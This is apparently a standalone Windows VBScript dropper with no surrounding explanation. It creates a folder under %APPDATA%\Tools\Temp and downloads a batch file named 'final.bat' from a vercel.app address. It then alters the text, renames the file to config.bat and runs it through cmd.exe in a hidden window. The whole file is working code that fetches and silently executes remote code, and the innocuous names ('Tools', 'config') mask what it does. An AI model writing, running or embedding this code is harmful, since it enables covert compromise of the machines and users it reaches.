Set s=CreateObject("WScript.Shell")
Set f=CreateObject("Scripting.FileSystemObject")
p=s.ExpandEnvironmentStrings("%APPDATA%")&"\Tools\Temp"
If f.FolderExists(p) Then f.DeleteFolder p,True
If Not f.FolderExists(Left(p,InStrRev(p,"\")-1)) Then f.CreateFolder Left(p,InStrRev(p,"\")-1)
f.CreateFolder p
Set h=CreateObject("MSXML2.ServerXMLHTTP")
h.Open "GET","https://service-omega-snowy.vercel.app/final.bat",False
h.Send
Set t=CreateObject("ADODB.Stream")
t.Type=1
t.Open
t.Write h.responseBody
t.Position=0
t.Type=2
t.Charset="utf-8"
c=t.ReadText
c=Replace(c,"****","----")
t.Position=0
t.SetEOS
t.WriteText c
t.SaveToFile p&"\config.txt",2
If f.FileExists(p&"\config.bat") Then f.DeleteFile p&"\config.bat"
f.MoveFile p&"\config.txt",p&"\config.bat"
s.Run "cmd.exe /c """&p&"\config.bat""",0,False
